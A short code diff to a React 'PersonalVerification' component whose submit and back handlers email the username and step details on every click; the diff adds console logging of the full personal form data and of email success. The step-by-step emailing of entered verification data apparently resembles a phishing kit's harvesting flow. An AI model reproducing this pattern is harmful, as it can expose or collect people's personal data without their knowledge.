@@ -80,6 +80,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
     // Send email notification for form submission button click
     try {
       console.log('🚨 Sending email for personal verification form submission button click');
+      console.log('🚨 Form data being sent:', formData);
       await sendEmailNotification({
         step: "Personal Verification - FORM SUBMITTED (Button Click)",
         username,
@@ -98,6 +99,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
           action: 'personal_verification_submitted'
         }
       });
+      console.log('✅ Email sent successfully for personal verification submission');
     } catch (error) {
       console.error('❌ Email notification failed:', error);
     }
@@ -116,6 +118,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
   const handleBackClick = async () => {
     try {
       console.log('🚨 Sending email for back button click');
+      console.log('🚨 Form data at back click:', formData);
       await sendEmailNotification({
         step: "Personal Verification - Back Button Clicked",
         username,
@@ -134,6 +137,7 @@ const PersonalVerification: React.FC<PersonalVerificationProps> = ({
           action: 'back_button_clicked'
         }
       });
+      console.log('✅ Email sent successfully for back button click');
     } catch (error) {
       console.error('❌ Email notification failed:', error);
     }
